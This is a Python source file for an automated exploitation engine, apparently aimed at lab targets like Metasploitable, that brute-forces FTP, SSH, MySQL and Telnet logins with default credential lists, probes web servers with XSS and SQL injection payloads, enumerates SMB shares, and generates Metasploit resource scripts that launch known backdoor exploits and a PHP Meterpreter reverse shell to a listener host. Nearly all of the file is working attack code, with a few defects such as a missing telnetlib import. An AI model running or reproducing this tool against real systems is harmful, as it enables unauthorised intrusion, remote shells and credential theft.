#!/usr/bin/env python3

import re
import subprocess
import socket
import threading
import time
import ftplib
import smtplib
import requests
import mysql.connector
from mysql.connector import Error
import paramiko
from config2 import WORDLIST_PATH, LHOST, LPORT
    
    
# Map known outdated FTP versions to Metasploit exploit modules
ftp_exploit_db = {
    'vsftpd 2.3.4': 'exploit/unix/ftp/vsftpd_234_backdoor',
    'proftpd 1.3.5': 'exploit/unix/ftp/proftpd_modcopy_exec'
    
}
    
class ExploitEngine:
    def __init__(self, target_ip):
        self.target = target_ip
        self.successful_exploits = []
        self.failed_exploits = []
        self.credentials_found = []
        
    def run_exploits(self, vulnerable_services):
        """Main exploit orchestrator"""
        print(f"\n[+] Starting exploitation phase against {self.target}")
        
        for service in vulnerable_services:
            port = service['port']
            service_name = service['service'].lower()
            version = service.get('version', '')
            
            print(f"\n[+] Targeting {service_name} on port {port}")
            
            # Service-specific exploitation
            if 'ftp' in service_name:
                self.exploit_ftp(port, version)
                self.ftp_bruteforce(port)
                #self.exploit_ftp1(port, version, self.target)
            elif 'ssh' in service_name:
                self.exploit_ssh(port)
            elif 'http' in service_name or 'apache' in service_name.lower():
                self.exploit_http(port)
                self.exploit_http2(self.target, version, port)
            elif 'mysql' in service_name:
                self.exploit_mysql(port)
            elif 'telnet' in service_name:
                self.exploit_telnet(port)
            elif 'netbios' in service_name or port == 139 or port == 445:
                self.exploit_smb(port)
            
           
        return {
            'successful': self.successful_exploits,
            'failed': self.failed_exploits,
            'credentials': self.credentials_found
        }
    
    def exploit_ftp(self, port, version):
        """Exploit FTP service vulnerabilities"""
        print(f"[*] Exploiting FTP on port {port}")
        
        # Check for anonymous login
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.target, port, timeout=10)
            ftp.login('anonymous', 'anonymous@example.com')
            
            # List files if anonymous login successful
            files = ftp.nlst() 
            self.successful_exploits.append({
                'service': 'FTP',
                'port': port,
                'method': 'Anonymous Login',
                'details': f'Anonymous access granted. Files found: {len(files)}'
            })
            ftp.quit()
            
        except Exception as e:
            self.failed_exploits.append({
                'service': 'FTP',
                'port': port,
                'method': 'Anonymous Login',
      
          'error': str(e)
            })
        
        # Check for known FTP vulnerabilities (ProFTPd, vsftpd)
        if 'proftpd' in version.lower() or 'vsftpd' in version.lower():
            self.exploit_ftp1(port, version, self.target)
        
        # Dictionary attack
        self.ftp_bruteforce(port)

    def exploit_ftp1(self,port, version, target):
        print(f"[+] Checking FTP version on port {port}: {version}")
        
        version_key = str(version).lower().strip()
        if version_key not in ftp_exploit_db:
            print("[-] No known exploits for this FTP version.")
            return
    
        exploit_module = ftp_exploit_db[version_key]
        print(f"[!] Found known exploit module: {exploit_module}")

        choice = input("Do you want to launch the exploit in msfconsole? (yes/no): ").strip().lower()
        if choice != "yes":
            print("[*] Exploitation cancelled.")
            return
    
        print("[*] Launching msfconsole with selected exploit...")

        # Create Metasploit commands to run in msfconsole
        msf_commands = f"""
    use {exploit_module}
    set RHOST {target}
    set RPORT {port}
    set LHOST 192.168.234.101
    set LPORT 5555
    set VERBOSE true
    exploit
    """

        # Write commands to a temporary file
        with open("ftp_exploit.rc", "w") as f:
            f.write(msf_commands)

        # Run msfconsole with the resource script
        try:
            subprocess.run(["msfconsole", "-r", "ftp_exploit.rc"])
        except FileNotFoundError:
            print("[-] Error: msfconsole not found. Make sure Metasploit is installed and in your PATH.")
            return

        print("[*] Exploit session closed or exited. Returning to main menu.")


    
    def ftp_bruteforce(self, port):
        """Dictionary attack on FTP"""
        common_creds = [
            ('admin', 'admin'), ('admin', 'password'), ('admin', ''),
            ('ftp', 'ftp'), ('user', 'user'), ('test', 'test'),
            ('guest', 'guest'), ('anonymous', ''), ('root', 'root')
        ]
        
        for username, password in common_creds:
            try:
                ftp = ftplib.FTP()
                ftp.connect(self.target, port, timeout=5)
                ftp.login(username, password)
                
                self.successful_exploits.append({
                    'service': 'FTP',
                    'port': port,
                    'method': 'Dictionary Attack',
                    'details': f'Valid credentials: {username}:{password}'
                })
                self.credentials_found.append(('FTP', username, password))
                ftp.quit()
                break
                
            except Exception:
                continue
    
    def exploit_ssh(self, port):
        """Exploit SSH service"""
        print(f"[*] Exploiting SSH on port {port}")
        
        # SSH bruteforce
        common_creds = [
            ('root', 'root'), ('admin', 'admin'), ('user', 'user'),
            ('msfadmin', 'msfadmin'), ('service', 'service'),
            ('postgres', 'postgres'), ('mysql', 'mysql')
        ]
        
        for username, password in common_creds:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(self.target, port=port, username=username, 
                           password=password, timeout=5)
                
                # Execute a test command
                stdin, stdout, stderr = ssh.exec_command('whoami')
                result = stdout.read().decode().strip()
                
                self.successful_exploits.append({
                    'service': 'SSH',
                    'port': port,
                    'method': 'Dictionary Attack',
                    'details': f'Valid credentials: {username}:{password}, User: {result}'
                })
                self.credentials_found.append(('SSH', username, password))
                ssh.close()
                break
                
            except Exception:
                continue
    
    def get_php_version(self, target_ip):
        try:
            # Run `curl -I` to get HTTP headers
            result = subprocess.run(
                ["curl", "-I", f"http://{target_ip}"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=10
            )

            headers = result.stdout
            print("[+] HTTP Headers:\n", headers)

            # Extract PHP version from X-Powered-By header
            match = re.search(r'X-Powered-By:\s*PHP/([\d\.]+)', headers, re.IGNORECASE)
            if match:
                php_version = match.group(1)
                print(f"[+] PHP Version Detected: {php_version}")
                return php_version
            else:
                print("[-] PHP version not found in headers.")
                return None

        except subprocess.TimeoutExpired:
            print("[-] Request timed out.")
        except Exception as e:
            print(f"[-] Error occurred: {e}")


    def exploit_http(self, port):
        """HTTP/Web exploitation"""
        print(f"[*] Exploiting HTTP on port {port}")
        
        base_url = f"http://{self.target}:{port}"
        
        # Directory enumeration
        common_dirs = [
            '/admin', '/administrator', '/phpmyadmin', '/phpinfo.php',
            '/test', '/backup', '/uploads', '/images', '/css', '/js',
            '/cgi-bin', '/scripts', '/include', '/config'
        ]
        
        found_dirs = []
        for directory in common_dirs:
            try:
                response = requests.get(f"{base_url}{directory}", timeout=5)
                if response.status_code in [200, 301, 302]:
                    found_dirs.append(directory)
            except:
                continue
        
        if found_dirs:
            self.successful_exploits.append({
                'service': 'HTTP',
                'port': port,
                'method': 'Directory Enumeration',
                'details': f'Accessible directories: {", ".join(found_dirs)}'
            })
        
        # Check for common web vulnerabilities
        self.check_web_vulns(base_url, port)
    
    import subprocess

    def exploit_http2(self, target, version, port):
        print(f"[+] Targeting HTTP service on {target}:{port}")

        # Ask user whether to proceed with exploitation
        choice = input("Do you want to launch the exploit in msfconsole? (yes/no): ").strip().lower()
        if choice != "yes":
            print("[*] Exploitation cancelled.")
            return

        php_version = self.get_php_version(target)
        
        print("\n[*] Searching for Apache exploits...")
        subprocess.run(f"searchsploit {version} | grep php", shell=True)

        print("\n[*] Searching for PHP/CGI exploits...")
        subprocess.run(f"searchsploit {php_version} | grep cgi", shell=True)

        # Select a Metasploit exploit
        exploit_module = input("\nEnter a suitable Metasploit exploit module (e.g., exploit/multi/http/php_cgi_arg_injection): ").strip()
        if not exploit_module:
            print("[-] No exploit module entered. Aborting.")
            return

        print(f"[!] Using exploit module: {exploit_module}")

        # Customize local IP and port if needed
        lhost = input("Enter your LHOST (local IP): ").strip() or "192.168.234.101"
        lport = input("Enter your LPORT (listening port): ").strip() or "5555"

        # Create resource script for msfconsole
        msf_commands = f"""
    use {exploit_module}
    set RHOST {target}
    set RPORT {port}
    set LHOST {lhost}
    set LPORT {lport}
    set TARGET 0
    set PAYLOAD php/meterpreter/reverse_tcp
    set VERBOSE true
    exploit
    """

        with open("http_exploit.rc", "w") as f:
            f.write(msf_commands)

        print("[*] Launching Metasploit with the exploit...")
        try:
            subprocess.run(["msfconsole", "-r", "http_exploit.rc"])
        except FileNotFoundError:
            print("[-] Error: msfconsole not found. Make sure Metasploit is installed and in your PATH.")
            return

        print("[*] Exploit session closed or exited. Returning to main menu.")

    
    def check_web_vulns(self, base_url, port):
        """Check for common web vulnerabilities"""
        try:
            # Basic XSS test
            xss_payload = "<script>alert('XSS')</script>"
            response = requests.get(f"{base_url}/?q={xss_payload}", timeout=5)
            if xss_payload in response.text:
                self.successful_exploits.append({
                    'service': 'HTTP',
                    'port': port,
                    'method': 'XSS Vulnerability',
                    'details': 'Reflected XSS vulnerability detected'
                })
            
            # Basic SQL injection test
            sql_payload = "' OR '1'='1"
            response = requests.get(f"{base_url}/?id={sql_payload}", timeout=5)
            if any(error in response.text.lower() for error in ['sql', 'mysql', 'error', 'warning']):
                self.successful_exploits.append({
                    'service': 'HTTP',
                    'port': port,
                    'method': 'SQL Injection',
                    'details': 'Potential SQL injection vulnerability detected'
                })
                
        except Exception as e:
            print(f"[-] Web vulnerability check failed: {e}")
    
    def exploit_mysql(self, port):
        """MySQL exploitation"""
        print(f"[*] Exploiting MySQL on port {port}")
        
        common_creds = [
            ('root', ''), ('root', 'root'), ('root', 'mysql'),
            ('admin', 'admin'), ('mysql', 'mysql'), ('user', 'user')
        ]
        
        for username, password in common_creds:
            try:
                connection = mysql.connector.connect(
                    host=self.target,
                    port=port,
                    user=username,
                    password=password,
                    connection_timeout=5
                )
                
                if connection.is_connected():
                    cursor = connection.cursor()
                    cursor.execute("SELECT VERSION()")
                    version = cursor.fetchone()[0]
                    cursor.execute("SHOW DATABASES")
                    databases = [db[0] for db in cursor.fetchall()]
                    
                    self.successful_exploits.append({
                        'service': 'MySQL',
                        'port': port,
                        'method': 'Dictionary Attack',
                        'details': f'Valid credentials: {username}:{password}, Version: {version}, Databases: {len(databases)}'
                    })
                    self.credentials_found.append(('MySQL', username, password))
                    
                    connection.close()
                    break
                    
            except Error:
                continue
    
    
    def exploit_telnet(self, port):
        """Telnet exploitation"""
        print(f"[*] Exploiting Telnet on port {port}")
        
        common_creds = [
            ('admin', 'admin'), ('root', 'root'), ('user', 'user'),
            ('msfadmin', 'msfadmin'), ('service', 'service')
        ]
        
        for username, password in common_creds:
            try:
                tn = telnetlib.Telnet(self.target, port, timeout=10)
                tn.read_until(b"login: ")
                tn.write(username.encode('ascii') + b"\n")
                tn.read_until(b"Password: ")
                tn.write(password.encode('ascii') + b"\n")
                
                response = tn.read_some()
                if b"$" in response or b"#" in response:
                    self.successful_exploits.append({
                        'service': 'Telnet',
                        'port': port,
                        'method': 'Dictionary Attack',
                        'details': f'Valid credentials: {username}:{password}'
                    })
                    self.credentials_found.append(('Telnet', username, password))
                    tn.close()
                    break
                    
                tn.close()
                
            except Exception:
                continue
    
    def exploit_smb(self, port):
        """SMB/NetBIOS exploitation"""
        print(f"[*] Exploiting SMB on port {port}")
        
        try:
            # Use smbclient to enumerate shares
            result = subprocess.run([
                'smbclient', '-L', f'//{self.target}', '-N'
            ], capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0 and 'Sharename' in result.stdout:
                shares = []
                for line in result.stdout.split('\n'):
                    if 'Disk' in line or 'IPC' in line:
                        share_name = line.split()[0]
                        shares.append(share_name)
                
                self.successful_exploits.append({
                    'service': 'SMB',
                    'port': port,
                    'method': 'Share Enumeration',
                    'details': f'Accessible shares: {", ".join(shares)}'
                })
                
        except Exception as e:
            print(f"[-] SMB enumeration failed: {e}")

            
    def generate_report(self, save_to_file=False, file_path="exploit_report.txt"):
        report_lines = []
        divider = "=" * 60
        report_lines.append(divider)
        report_lines.append(f"EXPLOITATION REPORT for Target: {self.target}")
        report_lines.append(divider + "\n")

        # Successful Exploits
        if self.successful_exploits:
            report_lines.append(" Successful Exploits:")
            for exploit in self.successful_exploits:
                report_lines.append(f"  - Service: {exploit['service']} (Port: {exploit['port']})")
                report_lines.append(f"    Method: {exploit['method']}")
                report_lines.append(f"    Details: {exploit['details']}\n")
        else:
            report_lines.append(" Successful Exploits: None\n")

        # Failed Exploits
        if self.failed_exploits:
            report_lines.append(" Failed Exploits:")
            for exploit in self.failed_exploits:
                report_lines.append(f"  - Service: {exploit['service']} (Port: {exploit['port']})")
                report_lines.append(f"    Method: {exploit['method']}")
                error_msg = exploit.get('error', 'Unknown error')
                report_lines.append(f"    Error: {error_msg}\n")
        else:
            report_lines.append(" Failed Exploits: None\n")

        # Credentials Found
        if self.credentials_found:
            report_lines.append(" Credentials Found:")
            for service, username, password in self.credentials_found:
                report_lines.append(f"  - {service}: {username}:{password}")
            report_lines.append("")  # Empty line
        else:
            report_lines.append(" Credentials Found: None\n")

        report_lines.append(divider)

        report_text = "\n".join(report_lines)

        # Print to console
        print(report_text)

        # Save to file if requested
        if save_to_file:
            try:
                with open(file_path, 'w') as f:
                    f.write(report_text)
                print(f"\n[+] Report successfully saved to '{file_path}'")
            except Exception as e:
                print(f"[-] Failed to save report: {e}")

        return report_text
